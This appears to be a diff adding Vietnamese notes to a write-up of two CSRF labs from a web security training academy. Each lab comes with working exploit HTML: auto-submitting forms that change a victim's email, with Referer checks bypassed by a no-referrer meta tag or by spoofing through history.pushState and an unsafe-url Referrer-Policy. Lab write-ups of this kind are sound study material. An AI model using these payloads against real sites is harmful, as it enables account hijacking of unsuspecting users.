@@ -53,3 +53,50 @@ Ta sẽ tạo form có sẵn chứa email và csrf cùng với url để Set-Coo
 </script>
 </body>
 </html>
+
+11: 
+
+Nhận xét: Khi xóa header referer thì web báo lỗi nhưng khi thay đổi referer thì có thể thay đổi email bình thường, tiến hành thêm header "referer" vào req bằng tag <meta> :
+
+<html>
+<body>
+<meta name="referrer" content="never">
+<script>history.pushState('', '', '/')</script>
+ <form action="https://0a3e0057039c4adcc068bc1d0067008d.web-security-academy.net/my-account/change-email" method="POST">
+  <input type="hidden" name="email" value="asda@asdsad">
+ </form>
+<script>
+ document.forms[0].submit();
+</script>
+</body>
+</html>
+
+12: 
+
+Nhận xét: Khi thay referer bằng cách thêm tiền tố vào nó thì vẫn có thể bypass validator của web. Sử dụng script sau để chèn hậu tố là url của Lab:
+
+<script>history.pushState("", "", "/?0a0c00f40489b31ec0db9ffa00350095.web-security-academy.net");</script>
+
+Body của exploit server sẽ như sau: 
+
+<html>
+<body>
+ <form action="https://0a0c00f40489b31ec0db9ffa00350095.web-security-academy.net/my-account/change-email" method="POST">
+  <input type="hidden" name="email" value="asda@asdsad">
+ </form>
+<script>history.pushState("", "", "/?0a0c00f40489b31ec0db9ffa00350095.web-security-academy.net");</script>
+<script>
+ document.forms[0].submit();
+</script>
+</body>
+</html>
+
+
+
+Tiếp theo, để có thể cho phép referrer lấy được phần sau dấu '?'
+Tại head Response của exploit server ta thêm Header:
+
+Referrer-Policy: unsafe-url 
+
+Bấm Deliver view to victim để hoàn thành bài
+
